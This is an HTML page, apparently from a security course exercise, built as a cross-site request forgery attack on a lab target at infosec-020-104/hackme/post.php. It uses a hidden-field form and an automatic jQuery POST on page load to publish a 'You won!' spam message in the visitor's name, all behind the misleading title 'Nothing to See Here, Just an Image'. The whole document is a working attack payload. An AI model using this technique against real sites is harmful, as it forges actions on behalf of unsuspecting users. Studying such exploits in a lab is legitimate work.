<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>Nothing to See Here, Just an Image</title>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	</head>
	<body>
		<h1>Having a nice day?</h1>
		<form action="http://infosec-020-104/hackme/post.php" method="post" target="body">
			<input type="hidden" name="title" value="You won!">
			<input type="hidden" name="message" value="You have been selected for a free flying dragon ride.">
			<input name="post_submit" type="submit" value="Click here to win $1,000,000!">
		</form>
		<script>
			window.onload = function() {
				var url = "http://infosec-020-104/hackme/post.php";
				var method = "POST";
				var postData = {
					title: 'You won!',
					message: 'You have been selected for a free flying dragon ride.',
					post_submit: true
				};
				$.ajax({
					type: method,
					url: url,
					data: postData,
					dataType: 'json'
				})
			}
		</script>
	</body>
</html>
